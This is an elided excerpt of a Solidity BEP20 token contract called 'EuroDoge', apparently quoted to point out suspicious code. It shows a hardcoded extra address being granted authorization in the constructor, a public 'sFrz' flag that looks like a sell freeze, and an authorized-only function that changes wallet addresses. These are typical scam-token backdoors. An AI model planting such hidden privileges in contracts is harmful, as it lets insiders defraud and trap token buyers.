...
abstract contract Auth {
    ...
    constructor(address _owner) {
        owner = _owner;
        authorizations[
    0x66D57A97AE8cFE5DD40AccC5E688d116d37e60F2] = true;
...
contract EuroDoge is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string private constant _name = "EuroDoge";    
    ...
    uint256 public bbf = 6;
    bool LFG = false;
    bool public sFrz = false;
    ...
    function setwalls(address _mrk, address _tfu) external authorized {
        mark = _mrk;
        tfU = _tfu;
